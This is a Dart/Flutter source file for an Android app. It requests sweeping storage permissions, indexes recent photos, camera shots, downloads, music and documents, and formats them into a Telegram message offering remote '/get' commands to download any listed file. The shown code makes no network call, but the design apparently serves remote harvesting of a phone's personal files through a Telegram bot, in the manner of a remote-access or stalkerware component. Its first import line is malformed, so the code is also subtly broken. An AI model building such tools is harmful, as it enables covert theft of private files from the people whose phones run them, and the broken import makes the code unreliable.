import 'dart0:io' if (dart.library.io) 'dart:io';
import 'package:permission_handler/permission_handler.dart';
import 'package:intl/intl.dart';

class FileInfo {
  final int id;
  final String name;
  final String path;
  final int sizeInBytes;
  final DateTime modified;
  final String category;

  FileInfo({
    required this.id,
    required this.name,
    required this.path,
    required this.sizeInBytes,
    required this.modified,
    required this.category,
  });

  String get formattedSize {
    if (sizeInBytes < 1024) return '$sizeInBytes B';
    if (sizeInBytes < 1024 * 1024) return '${(sizeInBytes / 1024).toStringAsFixed(1)} KB';
    if (sizeInBytes < 1024 * 1024 * 1024) return '${(sizeInBytes / (1024 * 1024)).toStringAsFixed(1)} MB';
    return '${(sizeInBytes / (1024 * 1024 * 1024)).toStringAsFixed(1)} GB';
  }

  String get emoji {
    switch (category) {
      case 'image': return '📷';
      case 'video': return '🎥';
      case 'audio': return '🎵';
      default: return '📄';
    }
  }
}

class FileScannerService {
  static final FileScannerService instance = FileScannerService._();
  FileScannerService._();

  final Map<int, String> fileIdPathMap = {};

  Future<bool> requestPermissions() async {
    if (Platform.isAndroid) {
      Map<Permission, PermissionStatus> statuses = await [
        Permission.storage,
        Permission.mediaLibrary,
        Permission.photos,
        Permission.videos,
        Permission.audio,
      ].request();

      // Check if manage external storage is available (Android 11+)
      if (await Permission.manageExternalStorage.isGranted == false) {
        await Permission.manageExternalStorage.request();
      }

      return statuses.values.any((s) => s.isGranted) ||
          await Permission.storage.isGranted ||
          await Permission.manageExternalStorage.isGranted;
    }
    return true;
  }

  Future<List<FileInfo>> scanRecentFiles({int days = 7}) async {
    fileIdPathMap.clear();
    List<FileInfo> results = [];
    final cutoffDate = DateTime.now().subtract(Duration(days: days));

    // Standard Android storage directories to scan
    final List<String> targetDirs = [
      '/storage/emulated/0/Download',
      '/storage/emulated/0/DCIM/Camera',
      '/storage/emulated/0/DCIM',
      '/storage/emulated/0/Pictures',
      '/storage/emulated/0/Music',
      '/storage/emulated/0/Documents',
    ];

    int counter = 1;

    for (String dirPath in targetDirs) {
      final dir = Directory(dirPath);
      if (await dir.exists()) {
        try {
          final entries = dir.listSync(recursive: false, followLinks: false);
          for (var entity in entries) {
            if (entity is File) {
              final stat = entity.statSync();
              if (stat.modified.isAfter(cutoffDate)) {
                // Ignore files larger than 50MB by default
                if (stat.size > 50 * 1024 * 1024) continue;

                final name = entity.uri.pathSegments.last;
                final ext = name.split('.').last.toLowerCase();

                String category = 'doc';
                if (['jpg', 'jpeg', 'png', 'gif', 'webp'].contains(ext)) category = 'image';
                else if (['mp4', 'mkv', 'mov', '3gp'].contains(ext)) category = 'video';
                else if (['mp3', 'wav', 'aac', 'm4a', 'opus'].contains(ext)) category = 'audio';

                final info = FileInfo(
                  id: counter,
                  name: name,
                  path: entity.path,
                  sizeInBytes: stat.size,
                  modified: stat.modified,
                  category: category,
                );

                fileIdPathMap[counter] = entity.path;
                results.add(info);
                counter++;
              }
            }
          }
        } catch (_) {}
      }
    }

    // Sort newest first
    results.sort((a, b) => b.modified.compareTo(a.modified));
    return results;
  }

  String buildTelegramMessage(List<FileInfo> files) {
    if (files.isEmpty) {
      return "📂 <b>No new files found in the last 7 days.</b>";
    }

    final StringBuffer buffer = StringBuffer();
    final today = DateTime.now();
    final todayStr = DateFormat('yyyy-MM-dd').format(today);

    buffer.writeln("📂 <b>Phone Files Index ($todayStr)</b>\n");

    for (var f in files.take(35)) {
      buffer.writeln("${f.id}. ${f.emoji} <code>${f.name}</code> (${f.formattedSize})");
    }

    if (files.length > 35) {
      buffer.writeln("\n<i>...and ${files.length - 35} more files.</i>");
    }

    buffer.writeln("\n<b>── Commands ──</b>");
    buffer.writeln("👉 <code>/get 1</code> (Download #1)");
    buffer.writeln("👉 <code>/get 1-5</code> (Download range)");
    buffer.writeln("👉 <code>/refresh</code> (Update list)");

    return buffer.toString();
  }
}
